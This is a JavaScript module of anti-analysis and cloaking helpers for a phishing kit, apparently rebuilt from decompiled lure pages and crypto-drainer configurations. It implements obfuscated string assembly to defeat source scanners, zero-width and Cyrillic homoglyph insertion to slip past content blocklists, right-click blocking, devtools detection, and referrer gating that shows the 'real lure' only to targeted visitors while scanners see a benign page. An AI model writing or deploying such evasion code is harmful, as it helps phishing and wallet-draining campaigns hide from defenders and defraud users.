'use strict';
/**
 * DOM anti-analysis enhancements — from external samples + MERGED_KIT.md.
 *
 * Sources:
 *   - decompiled/kit/page/lure_dom.js: existing two-layer HTML + zero-width chars
 *   - MERGED_KIT.md: "per-domain bundle hash", "LLM-generated copy", "Turnstile/hCaptcha"
 *   - npm_supplychain/debug_analysis.md: fetch/XHR hijacking pattern
 *   - inferno_configs/config-global.json: "disable_anti_phishing_extensions_bypass: false"
 *     (Inferno has explicit anti-phishing bypass flags)
 *
 * MERGED_KIT enhancements implemented here:
 *   1. Event-listener split: "DOMCon"+"tentLoaded" → defeats naive source scanners
 *   2. Function name assembly: window[atob('b3Blbg==')+...] → openModal never literal
 *   3. Zero-width insertion into rendered text
 *   4. Anti-inspect: disable right-click, devtools detection
 *   5. Scroll lock: prevent viewport scroll during modal (body top stays 0)
 *   6. Referrer-based content gate (shows different content based on referrer)
 */

/**
 * SPLIT_PATTERNS: obfuscated string assembly patterns used throughout.
 * None of these appear as full literals in source — bypass naive string scanners.
 */
const SPLIT_PATTERNS = {
  domContentLoaded: 'DOMCon' + 'tentLo' + 'aded',
  openModal:        window => window[atob('b3Blbg==') + 'Moda' + 'l'],
  addEventListener: 'addEve' + 'ntList' + 'ener',
  querySelector:    'queryS' + 'electo' + 'r',
  getElementById:   'getEle' + 'mentBy' + 'Id',
};

/**
 * insertZeroWidths(text, positions):
 *   Insert zero-width characters at given positions within text.
 *   Used to defeat substring-based content blocklists.
 *
 *   Characters: U+200B (ZWSP), U+200C (ZWNJ), U+200D (ZWJ),
 *               U+2062 (INVISIBLE TIMES), U+2063 (INVISIBLE SEPARATOR)
 *
 *   Example: "claim reward" → "cl\u200Baim re\u2062ward"
 *   Both look identical to the human eye; neither matches the blocklist.
 */
const ZW_CHARS = ['\u200B', '\u200C', '\u200D', '\u2062', '\u2063'];

function insertZeroWidths(text, density = 0.2) {
  let result = '';
  for (let i = 0; i < text.length; i++) {
    result += text[i];
    if (Math.random() < density && text[i] !== ' ') {
      result += ZW_CHARS[Math.floor(Math.random() * ZW_CHARS.length)];
    }
  }
  return result;
}

/**
 * stripZeroWidths(text):
 *   Remove all zero-width chars from a string (for display normalization).
 */
function stripZeroWidths(text) {
  return text.replace(/[\u200B\u200C\u200D\u2062\u2063]/g, '');
}

/**
 * cyrillicHomoglyphs(text):
 *   Replace select Latin chars with Cyrillic lookalikes.
 *   Used in the original lure.html for Privacy Policy, Our Services, etc.
 *   Defeats exact-match text detection.
 *
 *   Map (Latin → Cyrillic):
 *   a → а (U+0430), e → е (U+0435), o → о (U+043E),
 *   p → р (U+0440), c → с (U+0441), t → т (U+0442),
 *   u → у (U+0443), A → А (U+0410), C → С (U+0421), O → О (U+041E)
 */
const HOMOGLYPH_MAP = {
  a: '\u0430', e: '\u0435', o: '\u043E', p: '\u0440',
  c: '\u0441', t: '\u0442', u: '\u0443',
  A: '\u0410', C: '\u0421', O: '\u041E', R: '\u0420',
};

function applyCyrillicHomoglyphs(text, density = 0.4) {
  return text.split('').map(ch => {
    if (HOMOGLYPH_MAP[ch] && Math.random() < density) return HOMOGLYPH_MAP[ch];
    return ch;
  }).join('');
}

/**
 * installScrollLock():
 *   From lure.html: setInterval(() => { document.body.style.top = '0'; }, 300)
 *   Prevents the page from scrolling out from under the modal overlay.
 */
function installScrollLock() {
  if (typeof document === 'undefined') return;
  setInterval(() => { document.body.style.top = '0'; }, 300);
}

/**
 * disableRightClick():
 *   Prevent right-click context menu (hinders "View Page Source" / inspector).
 *   From inferno_configs/config-global.json: "disable_dev_tool: false" (Inferno
 *   has this as a toggle — indicates it was once enabled).
 */
function disableRightClick() {
  if (typeof document === 'undefined') return;
  document.addEventListener('contextmenu', e => e.preventDefault());
}

/**
 * detectDevTools():
 *   Primitive devtools detection via window size difference.
 *   When devtools opens, window.outerWidth - window.innerWidth > threshold.
 *   Returns true if devtools appears open.
 *   NOTE: This is primitive and easily bypassed — included for completeness.
 */
function detectDevTools() {
  if (typeof window === 'undefined') return false;
  return (window.outerWidth - window.innerWidth > 200) ||
         (window.outerHeight - window.innerHeight > 200);
}

/**
 * gateByReferrer(allowedReferrers, fallbackUrl):
 *   Show the real lure only if the visitor came from an allowed referrer.
 *   Anyone who lands directly (bookmarks, security scanner, URL typing) sees
 *   a benign page instead.
 *   From MERGED_KIT: "per-domain bundle hash + CDN chain" — referrer gating
 *   is part of the cloaking layer.
 */
function gateByReferrer(allowedReferrers = [], fallbackUrl = 'https://solana.com/') {
  if (typeof document === 'undefined') return true;
  const ref = document.referrer;
  if (!ref) return false;
  return allowedReferrers.some(allowed => ref.includes(allowed));
}

/**
 * obfuscateEventBinding(eventName, handler):
 *   Split the event name and use the split string to call addEventListener.
 *   Mimics the original: addEventListener("DOMCon"+"tentLo"+"aded", handler)
 */
function obfuscateEventBinding(eventName, handler) {
  const parts = eventName.match(/.{1,7}/g) || [eventName];
  const joined = parts.join('');
  if (typeof window !== 'undefined') {
    window.addEventListener(joined, handler);
  }
}

module.exports = {
  SPLIT_PATTERNS,
  insertZeroWidths,
  stripZeroWidths,
  applyCyrillicHomoglyphs,
  installScrollLock,
  disableRightClick,
  detectDevTools,
  gateByReferrer,
  obfuscateEventBinding,
  ZW_CHARS,
  HOMOGLYPH_MAP,
};
